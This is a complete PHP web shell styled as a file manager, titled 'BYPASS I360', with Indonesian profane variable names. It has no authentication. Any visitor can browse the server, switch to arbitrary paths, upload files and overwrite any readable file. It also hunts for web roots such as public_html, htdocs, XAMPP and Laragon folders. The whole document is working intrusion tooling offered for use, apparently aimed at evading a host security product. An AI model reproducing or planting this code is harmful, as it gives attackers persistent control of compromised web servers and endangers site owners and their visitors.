<?php
declare(strict_types=1);
session_start();

$bangsat = realpath(__DIR__); 
if ($bangsat === false) { exit("anjink base ilang"); }

function gH(): ?string { 
    $asuu = getenv('USERPROFILE') ?: (getenv('HOMEDRIVE') . getenv('HOMEPATH'));
    return is_string($asuu) && $asuu !== '' ? $asuu : null;
}

function h($s): string { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }

function nP($r): string { 
    $ngodingbangsat = str_replace(["\0", '\\'], ['', '/'], $r);
    $p = explode('/', ltrim($ngodingbangsat, '/'));
    $s = [];
    foreach ($p as $i) {
        if ($i === '' || $i === '.') continue;
        if ($i === '..') { array_pop($s); continue; }
        $s[] = $i;
    }
    return implode('/', $s);
}

function sP($b, $r): string { 
    $r = nP($r);
    $goblok = $b . DIRECTORY_SEPARATOR . $r;
    $f = realpath($goblok);
    return ($f !== false) ? $f : $goblok;
}

function fW($r, $d = 4): array { 
    $targetanjink = ['public_html', 'htdocs', 'www'];
    $f = []; $q = [];
    foreach ($r as $i) { if (is_string($i) && is_dir($i)) $q[] = [$i, 0]; }
    while (!empty($q) && count($f) < 50) {
        [$v, $z] = array_shift($q);
        if ($z > $d) continue;
        if (in_array(basename($v), $targetanjink)) $f[] = $v;
        $m = @scandir($v);
        if ($m) {
            foreach ($m as $n) {
                if ($n === '.' || $n === '..' || $n[0] === '.') continue;
                $x = $v . DIRECTORY_SEPARATOR . $n;
                if (is_dir($x)) $q[] = [$x, $z + 1];
            }
        }
    }
    return array_unique($f);
}

$pusingcuk = array_unique(array_merge([$bangsat], (gH() ? [gH()] : []), fW([$bangsat, 'C:\\xampp', 'C:\\laragon'])));

if (isset($_GET['set'])) { $_SESSION['b'] = realpath(rawurldecode($_GET['set'])); header('Location: ?'); exit; }
if (isset($_GET['reset'])) { unset($_SESSION['b']); header('Location: ?'); exit; }

$currb = (isset($_SESSION['b']) && is_dir($_SESSION['b'])) ? $_SESSION['b'] : $bangsat;
$rel = $_GET['dir'] ?? '';
$locasuu = sP($currb, (string)$rel);
if (!is_dir($locasuu)) { $locasuu = $currb; $rel = ''; }

$pesanbgst = ''; $errortolol = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['a'] ?? '') === 'up') {
    $f = $_FILES['u'];
    $pathbangsat = $locasuu . DIRECTORY_SEPARATOR . basename($f['name']);
    if (move_uploaded_file($f['tmp_name'], $pathbangsat)) { $pesanbgst = "berhasil cuk!"; } else { $errortolol = "gagal anjink"; }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['a'] ?? '') === 'sv') {
    $filememek = sP($currb, $_POST['f']);
    if (file_put_contents($filememek, $_POST['c']) !== false) { $pesanbgst = "kesimpen wkwkw"; } else { $errortolol = "gagal cuy"; }
}

$editbgst = $_GET['ed'] ?? '';
$kontenanjing = ''; $cane = false;
if ($editbgst !== '') {
    $ped = sP($currb, (string)$editbgst);
    if (is_file($ped) && is_readable($ped) && filesize($ped) <= 1048576) {
        $kontenanjing = (string)file_get_contents($ped);
        $cane = true;
    }
}

$listsampah = @scandir($locasuu) ?: [];
$parentbgst = ($locasuu !== $currb) ? nP(dirname($rel)) : '';
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <title>FILE MANAGER - BYPASS I360</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .p { background: #0a0a0a; border: 1px solid #222; padding: 10px; margin-bottom: 10px; box-shadow: 0 0 10px #003300; }
        a { color: #00ccff; text-decoration: none; }
        input, textarea { background: #000; color: #0f0; border: 1px solid #333; width: 100%; padding: 8px; }
        button { background: #1a1a1a; color: #fff; border: 1px solid #444; cursor: pointer; padding: 5px 15px; margin-top: 5px;}
        table { width: 100%; border-collapse: collapse; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #111; }
        .hrline { border-bottom: 1px dashed #333; margin: 10px 0; }
    </style>
</head>
<body>
    <h2>[ FILE MANAGER - BYPASS I360 ]</h2>
    
    <?php if ($pesanbgst): ?><div class="p" style="color:#00ff00">> <?= h($pesanbgst) ?></div><?php endif; ?>
    <?php if ($errortolol): ?><div class="p" style="color:#ff0000">> <?= h($errortolol) ?></div><?php endif; ?>

    <div class="p">
        <div>Base: <?= h($currb) ?></div>
        <div>Current: <?= h($locasuu) ?></div>
        <div class="hrline"></div>
        <table>
            <tr><th>Name</th><th>Size</th><th>Act</th></tr>
            <?php if ($parentbgst !== '' || $rel !== ''): ?>
            <tr><td><a href="?dir=<?= h($parentbgst) ?>">.. [BALIK]</a></td><td>-</td><td>-</td></tr>
            <?php endif; ?>
            <?php foreach ($listsampah as $n): if ($n==='.'||$n==='..') continue; 
                $fullbgst = $locasuu . DIRECTORY_SEPARATOR . $n;
                $isD = is_dir($fullbgst);
                $relitem = nP(($rel === '' ? '' : $rel . '/') . $n);
            ?>
            <tr>
                <td><?= $isD ? "[D] <a href='?dir=".h($relitem)."'>".h($n)."</a>" : "[F] ".h($n) ?></td>
                <td><?= $isD ? "-" : filesize($fullbgst) ?></td>
                <td><?= !$isD ? "<a href='?dir=".h($rel)."&ed=".h($relitem)."'>EDIT</a>" : "-" ?></td>
            </tr>
            <?php endforeach; ?>
        </table>
    </div>

    <div class="p">
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="a" value="up">
            <input type="file" name="u">
            <button type="submit">UPLOAD</button>
        </form>
    </div>

    <?php if ($cane): ?>
    <div class="p">
        <form method="post">
            <div>FILE: <?= h($editbgst) ?></div>
            <input type="hidden" name="a" value="sv">
            <input type="hidden" name="f" value="<?= h($editbgst) ?>">
            <textarea name="c" rows="18"><?= h($kontenanjing) ?></textarea>
            <button type="submit">SAVE</button>
        </form>
    </div>
    <?php endif; ?>

    <div class="p">
        JUMP: <?php foreach($pusingcuk as $v): ?> <a href="?set=<?=rawurlencode($v)?>">[<?=basename($v)?>]</a> <?php endforeach; ?>
        | <a href="?reset=1">[RESET BASE]</a>
    </div>
</body>
</html>
